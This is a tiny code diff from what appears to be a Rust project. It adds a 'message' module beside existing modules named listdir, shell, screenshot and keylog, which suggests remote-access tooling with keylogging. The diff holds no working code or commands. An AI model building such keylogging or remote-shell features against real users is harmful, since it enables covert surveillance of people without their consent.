@@ -5,6 +5,7 @@ pub mod listdir;
 pub mod shell;
 pub mod screenshot;
 pub mod keylog;
+pub mod message;
 
 use serde::{Deserialize, Serialize};
 use std::any::Any;
